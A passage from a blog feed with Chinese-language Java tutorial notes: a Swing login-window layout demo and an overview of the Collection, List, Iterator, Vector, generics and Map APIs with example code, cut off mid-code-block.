    <content type="html"><![CDATA[<h3 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h3><ul><li><p>1.Swing工具包下有MVC结构，所谓MVC结构就是：模型(数据)+视图(界面)+控制(监听事件)</p></li><li><p>2.JFrame窗体</p><ul><li><p>构造JFrame对象</p></li><li><p>设定窗体宽高setSize()</p></li><li><p>设定窗体可见setVisible()</p></li><li><p>设定关闭方式(根据情况设定)</p></li><li><p>setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE)</p></li></ul></li><li><p>DO_NOTHING_ON_CLOSE”、“DISPOSE_ON_CLOSE”、“HIDE_ON_CLOSE”、“EXIT_ON_CLOSE”。</p><ul><li>第一种表示什么也不做就将窗体关闭；</li><li>第二种表示任何注册监听程序对象后会自动隐藏并释放窗体；</li><li>第三种表示隐藏窗口的默认窗口关闭；</li><li>第四种表示退出应用程序默认窗口关闭。</li></ul></li><li><p>3.Swing包</p><ul><li>文本框—-JTextField</li><li>密码框—-JPasswordField</li><li>标签—-JLable</li><li>复选框—–jCheckBox</li><li>单选框—–JRadioButton(同一组单选按钮必须先创建ButtonGroup，然后把单选框组件放入到ButtonGroup中)</li></ul></li></ul><h3 id="登录界面Demo"><a href="#登录界面Demo" class="headerlink" title="登录界面Demo"></a>登录界面Demo</h3><h4 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h4><ul><li>(1)用到的窗体</li></ul><pre><code class="hljs">-    这次项目中使用的窗体为JFrame，实现图形界面，首先必须有一个顶级窗体</code></pre><ul><li>(2) 使用到的标签</li></ul><pre><code class="hljs">-   Jlabel 标签元素类，显示文字和图片-   JTextField 文本输入框元素组件类，接收用户输入信息并将其显示-   JPasswordField 密码输入框组件类，接收用户输入的信息，然后把每一个字符都用一个加密符号显示-   JButton 按钮元素组件类，显示文字或图片，也可以一起显示，可以点击</code></pre><ul><li>(3) 使用到的布局</li></ul><pre><code class="hljs">-   java.awt.FlowLayout   流式布局类-   java.awt.Dimension   封装组件宽度和高度的类</code></pre><ul><li>布局类是针对容器组件的，它会让添加到容器上的组件按照布局类的方式去排列对齐。</li><li>如果我们没有设置窗体的布局，那么我们添加的组件就会出现覆盖的问题，最后只会显示最后添加的那个组件流式布局的效果类似于word文档，对组件按行进行排列，当前行满了再放到下一行。但是不能像word一样回车换行。</li></ul><h4 id="二、项目逻辑"><a href="#二、项目逻辑" class="headerlink" title="二、项目逻辑"></a>二、项目逻辑</h4><ul><li>创建JFrame窗体<ul><li>1.设置窗体文字</li><li>2.设置窗体大小</li><li>3.设置窗体大小不可调(<strong>setResizable(false)</strong>)</li><li>4.设置窗体相对于另一个窗体居中位置(<strong>setLocationRelativeTo(null)</strong>)</li><li>5.设置窗体关闭</li><li>6.设置窗体居中显示</li></ul></li><li>使用流式布局<ul><li>1.创建流式布局对象并实例化</li><li>2.设置对齐方式为居中，组件间隔为10(视情况而定)</li></ul></li><li>设置除顶级窗体大小外，其他<strong>组件</strong>大小<ul><li>Dimension(hight,weight)</li></ul></li><li>创建JLabel标签并添加到窗体<ul><li>1.创建用户名和密码标签</li><li>2.添加到窗体</li></ul></li><li>创建JTextField和JPasswordField组件并添加到窗体<ul><li>1.创建输入文本框和密码框对象</li><li>2.调用setPreferredSize()方法设置文本框和密码框大小</li><li>3.添加到窗体</li></ul></li><li>创建JButton组件并添加到窗体<ul><li>1.创建登录和注册按钮标签</li><li>2.调用setText()方法在按钮上显示登录和注册</li><li>3.添加到窗体</li></ul></li><li>使窗体可显示</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Frame</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Jframe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//设定窗体容器</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>();<br>        frame.setTitle(<span class="hljs-string">&quot;社团成员登录界面&quot;</span>); <span class="hljs-comment">//容器文字</span><br>        frame.setSize(<span class="hljs-number">350</span>,<span class="hljs-number">120</span>);<span class="hljs-comment">//容器大小</span><br>        frame.setResizable(<span class="hljs-literal">false</span>);<span class="hljs-comment">// 设置禁止调整窗体大小</span><br>        frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);<span class="hljs-comment">// 设置窗体相对于另一个组件的居中位置，</span><br>        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);                  <span class="hljs-comment">//容器关闭</span><br>        frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);<span class="hljs-comment">//居中显示</span><br><br>        <span class="hljs-comment">//使用流式布局，对齐方式居中，组件间隔为10</span><br>        <span class="hljs-type">FlowLayout</span> <span class="hljs-variable">fl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>(FlowLayout.CENTER,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<br>        frame.setLayout(fl);<br><br>        <span class="hljs-comment">//Dimension 类封装单个对象中组件的宽度和高度（精确到整数）</span><br>        <span class="hljs-type">Dimension</span> <span class="hljs-variable">dim1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">100</span>,<span class="hljs-number">20</span>);<br><br>        <span class="hljs-comment">//创建标签对象，该对象显示为用户名，并将其添加到窗体上</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">lbUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;用户名：&quot;</span>);<br>        frame.add(lbUser);<br>        <span class="hljs-comment">//创建用户名文本框</span><br>        <span class="hljs-type">TextField</span> <span class="hljs-variable">text_name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextField</span>();<br>        text_name.setPreferredSize(dim1);<span class="hljs-comment">//设置除顶级容器组件其他组件的大小</span><br>        frame.add(text_name);<span class="hljs-comment">//添加到容器</span><br><br>        <span class="hljs-comment">//创建标签对象，该对象显示为密码，并将其添加到窗体上</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">lbPass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;密码：&quot;</span>);<br>        frame.add(lbPass);<br>        <span class="hljs-comment">//创建密码文本框</span><br>        <span class="hljs-type">JPasswordField</span> <span class="hljs-variable">text_pass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPasswordField</span>();<br>        text_pass.setPreferredSize(dim1);<br>        frame.add(text_pass); <span class="hljs-comment">//！！！注意：这里必须是创建一个标签对应创建一个相应文本框</span><br>        <br>        <span class="hljs-comment">//设置登录注册按钮</span><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">btn_Up</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>();<br>        btn_Up.setText(<span class="hljs-string">&quot;登录&quot;</span>);<span class="hljs-comment">//调用setText()方法在按钮上显示登录</span><br>        frame.add(btn_Up);<br><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">btn_Sign</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>();<br>        btn_Sign.setText(<span class="hljs-string">&quot;注册&quot;</span>);<span class="hljs-comment">//调用setText()方法在按钮上显示注册</span><br>        frame.add(btn_Sign);<br><br>        <span class="hljs-comment">//使窗体可见</span><br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Login</span>().Jframe();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ol><li><a href="https://blog.51cto.com/javanew/1956117">https://blog.51cto.com/javanew/1956117</a></li><li><a href="https://blog.51cto.com/javanew/1955440">https://blog.51cto.com/javanew/1955440</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GUI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---集合02</title>
    <link href="/2020/05/15/JavaSe%E5%9F%BA%E7%A1%80---%E9%9B%86%E5%90%8802/"/>
    <url>/2020/05/15/JavaSe%E5%9F%BA%E7%A1%80---%E9%9B%86%E5%90%8802/</url>
    
    <content type="html"><![CDATA[<h4 id="一、集合："><a href="#一、集合：" class="headerlink" title="一、集合："></a>一、集合：</h4><ul><li><p>1.1 什么是集合，有什么用？</p><ul><li>集合实际上是一个容器，可以容纳其他类型的数据。</li><li>数组就是一个集合。</li></ul></li><li><p>1.2 集合不能直接存储基本数据类型，另外集合也不能直接存储java对象，集合当中存储的都是java对象的内存地址。</p></li><li><p><strong>注：集合在<strong><strong>java</strong></strong>中本身是一个容器，是一个对象</strong></p></li><li><p><strong>集合中任何时候存储的都是</strong><strong>“<strong><strong>引用</strong></strong>“</strong></p></li><li><p>1.3 在Java中每一个不同的集合底层会对应不同的数据结构，往不同的集合中存储元素等于将数据放到了不同的数据结构中使用不同的集合等于使用了不同的数据结构</p></li><li><p>1.4 集合在java.util.*;包下</p></li><li><p>1.5 在Java中集合分为两大类：</p><ul><li><p>一类是单个方式存储元素，这一类集合中超级父接口java.util.collection</p></li><li><p>一类是以key和valuer的方式存储元素，这一类集合中超级父接口java.util.Map;</p></li></ul></li></ul><h4 id="二、关于java-util-collection接口中常用的方法："><a href="#二、关于java-util-collection接口中常用的方法：" class="headerlink" title="二、关于java.util.collection接口中常用的方法："></a>二、关于java.util.collection接口中常用的方法：</h4><ul><li>1.collection中能存放什么元素？<ul><li>没有用”泛型”前，collection中可以存储object中所有子类型，使用”泛型”后，collection中只能存储某个具体的类型，但是不能存储基本数据类型和java对象。</li></ul></li><li>2.collection中常用的方法<ul><li>boolean add(Object e)—-向集合中添加元素</li><li>int size()—–获取集合中元素的个数</li><li>void clear()—–清空集合</li><li>boolean contains()—-判断集合中是否包含某个元素</li><li>boolean remove(Object o)—-删除集合中的某个元素</li><li>boolean isEmpty()—–判断该集合是否为空</li><li>Object[] toArray—-调用这个方法可以把集合转化为数组</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CollectionText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//Collection是一个接口无法实例化，所以使用多态，父类型引用指向子类型对象</span><br>        <span class="hljs-type">Collection</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-comment">//向集合中添加元素</span><br>        c.add(<span class="hljs-number">1200</span>);<br>        c.add(<span class="hljs-number">3.14</span>);<br>        c.add(<span class="hljs-literal">true</span>);<br>        c.add(<span class="hljs-string">&quot;Hello World&quot;</span>);<br><br>        <span class="hljs-comment">//获取集合中元素的个数</span><br>        System.out.println(<span class="hljs-string">&quot;该集合元素的个数为：&quot;</span> + c.size());<br><br>        <span class="hljs-comment">// 清空集合</span><br>        <span class="hljs-comment">// c.clear();</span><br>        <span class="hljs-comment">// System.out.println(&quot;该集合元素个数为：&quot; + c.size());</span><br><br>        <span class="hljs-comment">//判断该集合中是否包含某个元素</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> c.contains(<span class="hljs-number">1200</span>);<br>        System.out.println(b);<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> c.contains(<span class="hljs-string">&quot;helllo&quot;</span>);<br>        System.out.println(b2);<br><br>        <span class="hljs-comment">//删除集合中某个元素</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> c.remove(<span class="hljs-number">1200</span>);<br>        System.out.println(c);<br><br>        c.add(<span class="hljs-number">1200</span>);<br>        c.add(<span class="hljs-string">&quot;马克&quot;</span>);<br><br>        <span class="hljs-comment">//判断该集合是否为空</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> c.isEmpty();<br>        System.out.println(c2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="三、集合原理："><a href="#三、集合原理：" class="headerlink" title="三、集合原理："></a>三、集合原理：</h4><ul><li>collection中的迭代方式只能在collection以及子类中使用</li><li>对集合进行遍历&#x2F;迭代：<ul><li>第一步：获取集合对象的迭代器对象Iterator</li><li>第二步：通过以上获取迭代器对象开始迭代&#x2F;遍历<ul><li>boolean hasNext()—-如果有元素可以迭代则返回True</li><li>Object next()—-返回迭代下一个元素</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">itertionText</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建集合对象</span><br>        <span class="hljs-type">Collection</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-comment">//给集合中添加元素</span><br>        c.add(<span class="hljs-string">&quot;hello World&quot;</span>);<br>        c.add(<span class="hljs-number">1234</span>);<br>        c.add(<span class="hljs-number">3.14</span>);<br>        c.add(<span class="hljs-literal">true</span>);<br>        c.add(<span class="hljs-string">&quot;浩克&quot;</span>);<br>        c.add(<span class="hljs-number">3</span>);<br><br>        <span class="hljs-comment">//第一步先获取迭代器对象开始迭代/遍历集合</span><br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> c.iterator();<br><br>        <span class="hljs-comment">//通过以上获取的迭代器对象开始遍历/迭代</span><br>        <span class="hljs-keyword">while</span>(it.hasNext())&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> it.next();  <span class="hljs-comment">//这个方法让迭代器前进一位获取元素</span><br>            System.out.println(obj);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="四、深入Collection中的contains方法"><a href="#四、深入Collection中的contains方法" class="headerlink" title="四、深入Collection中的contains方法"></a>四、深入Collection中的contains方法</h4><ul><li>1.boolean contains(Object o) 如果包含返回true，如果不包含返回false</li><li>2.contains 方法是用来判断集合中是否包含某个元素的方法，底层调用equals方法进行对比，返回true表示包含这个元素</li><li>3.存放在集合中的类型，一定要重写equals方法</li></ul><h4 id="五、关于集合元素的remove"><a href="#五、关于集合元素的remove" class="headerlink" title="五、关于集合元素的remove"></a>五、关于集合元素的remove</h4><ul><li>1.当集合的结构发生改变时，必须重新获取迭代器否则会爆出异常”java.util.ConcurrentModificationExeption”</li><li>2.在迭代集合元素过程中不能调用集合对象的remove方法，删除元素否侧会报异常</li><li>3.迭代器删除时会自动更新迭代器，并且更新集合，出现“java.util.ConcurrentModificationExeption”是因为集合当中元素删除了但是没有更新迭代器</li><li>4.在迭代器元素的过程中，一定要使用迭代器Iterator的remove方法，删除元素，不要使用集合自带的remove方法删除元素</li></ul><h4 id="六、关于ArraysList集合"><a href="#六、关于ArraysList集合" class="headerlink" title="六、关于ArraysList集合"></a>六、关于ArraysList集合</h4><ul><li><p>1.ArrayList集合初始化容量为10，扩容倍数为1.5倍，底层先创建一个长度为0的数组，当添加第一个元素时候，初始容量为10。</p></li><li><p>2.底层是一个数组数据结构</p></li><li><p>3.构造方法：</p><ul><li>New ArrayList()</li><li>New ArrayList(20)</li></ul></li><li><p>4.如何优化</p><ul><li>尽可能减少扩容，因为数组扩容效率比较低，使用该集合时候预估元素个数，给定一个初始化容量减少扩容次数</li></ul></li><li><p>5.数组的优缺点：</p><ul><li>优点：检索效率高</li><li>缺点：随机增删元素效率比较低，但是向末尾添加元素效率还是很高</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 集合;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * List接口中常用的方法</span><br><span class="hljs-comment"> *   void add(int index,Object element)</span><br><span class="hljs-comment"> *   Object get(int index)</span><br><span class="hljs-comment"> *   int indexOf(Object o)</span><br><span class="hljs-comment"> *   Object remove(int index)</span><br><span class="hljs-comment"> *   Object set(int index,object element)</span><br><span class="hljs-comment"> * */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">List</span> <span class="hljs-variable">myList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>        myList.add(<span class="hljs-string">&quot;C&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;D&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;C&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;D&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;C&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;A&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;B&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;A&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;B&quot;</span>);<br>        myList.add(<span class="hljs-string">&quot;C&quot;</span>);<br><br>        <span class="hljs-comment">//一般不使用，对于ArrayList集合来说处理大量数据时此方法效率低</span><br>        <span class="hljs-comment">//根据元素下标向集合添加元素</span><br>        myList.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;King&quot;</span>);<br>        myList.add(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;Jack&quot;</span>);<br>        myList.add(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;Make&quot;</span>);<br><br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> myList.iterator();<br>        <span class="hljs-keyword">while</span>(obj.hasNext())&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">jet</span> <span class="hljs-operator">=</span> obj.next();<br>            System.out.println(jet);     <span class="hljs-comment">//顺序：A B King Jack C Make D</span><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br><br>        <span class="hljs-comment">//根据下标获取元素</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">firstList</span> <span class="hljs-operator">=</span> myList.get(<span class="hljs-number">3</span>);<br>        System.out.println(firstList);<br><br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br><br>        <span class="hljs-comment">//根据元素下标使用for循环进行遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i &lt; myList.size();i++)&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objFirst</span> <span class="hljs-operator">=</span> myList.get(i);<br>            System.out.println(objFirst);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br><br>        <span class="hljs-comment">//获取元素第一次和最后一次出现的索引</span><br>        System.out.println(myList.indexOf(<span class="hljs-string">&quot;B&quot;</span>));<br>        System.out.println(myList.lastIndexOf(<span class="hljs-string">&quot;A&quot;</span>));<br><br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br><br>        <span class="hljs-comment">//根据下标删除元素</span><br>        myList.remove(<span class="hljs-number">4</span>);   <span class="hljs-comment">//删除下标为4的元素</span><br>        System.out.println(myList.size());<br><br>        System.out.println(<span class="hljs-string">&quot;==============================================&quot;</span>);<br><br>        <span class="hljs-comment">//修改指定下标的元素</span><br>        myList.set(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;9&quot;</span>);<br>        myList.set(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;Tom&quot;</span>);<br>        myList.set(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;3.1345&quot;</span>);<br>        myList.set(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;Home&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; myList.size(); i++) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> myList.get(i);<br>            System.out.println(o);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h4 id="七、单向链表数据结构和Vector集合"><a href="#七、单向链表数据结构和Vector集合" class="headerlink" title="七、单向链表数据结构和Vector集合"></a>七、单向链表数据结构和Vector集合</h4><ul><li>1.对于链表数据结构来说基本单元是节点(Node)</li><li>2.每一个节点Node都有两个属性，一个属性是存储数据，另一个是下一个节点的内存地址</li><li>3.链表的优点：<ul><li>由于链表上的元素在空间存储上内存地址不连续，所以随机增删元素的时候不会有大量元素位移，因此随机增删元素效率较高，在以后开发中如果遇到随机增删元素的业务比较多时建议使用LinkedList集合</li></ul></li><li>4.链表的缺点：<ul><li>不能通过数学表达式计算被查找元素的内存地址，每一次查找都是从头节点开始遍历，直到找到为止，所以遍历&#x2F;检索效率较低</li></ul></li><li>关于Vector集合：<ul><li>1.底层也是一个数组</li><li>2.初始容量为10</li><li>3.扩容之后是原容量的2倍</li><li>4.vector中所有的方法都是同步的，都带有synchronized关键字，是线程安全的，效率较低，使用较少</li></ul></li></ul><h4 id="八、泛型"><a href="#八、泛型" class="headerlink" title="八、泛型"></a>八、泛型</h4><ul><li>1.JDK5.0之后推出的新特性：泛型</li><li>2.泛型这种语法机制只在程序编译阶段起作用只是给编译器参考的(运行阶段泛型没用)</li><li>3.使用泛型的好处：<ul><li>集合存储元素类型统一</li><li>从集合中取出的元素类型是泛型指定的类型，不需要大量“向下转型”</li></ul></li><li>4.泛型的缺点：<ul><li>导致集合中存储元素缺乏多样性</li></ul></li><li>5.在JDK8以后引入了自动类型推断机制（钻石表达式）</li></ul><h4 id="九、Java-util-Map接口中常用方法"><a href="#九、Java-util-Map接口中常用方法" class="headerlink" title="九、Java.util.Map接口中常用方法"></a>九、Java.util.Map接口中常用方法</h4><ul><li><p>1.Map和Collection没有继承关系</p></li><li><p>2.Map集合以key和value方式存储数据：键值对儿</p></li></ul><pre><code class="hljs">-   key和value都是引用数据类型-   key和value都是存储对象的内存地址-   key起主导地位，value是key的一个附属品</code></pre><ul><li>3.常用方法：</li></ul><pre><code class="hljs">-   void clear()----&gt;清空集合-    boolean containsKey(Object key)----&gt;判断集合中是否包含key-   boolean containsValue(Object value)----&gt;判断集合中是否包含values-   Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()----&gt;将Map集合转为Set集合-   V get(Object key)----&gt;通过key获取value-    boolean isEmpty()----&gt;判断集合中元素个数是否为0-   Set&lt;K&gt; keySet()----&gt;获取集合中所有的key-    void put(K key , V value)----&gt;添加数据-   V remove(Object key)----通过key删除键值对儿-   int size()----&gt;获取键值对儿个数-   Collection&lt;V&gt; values()----&gt;获取所有value，返回一个collection<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 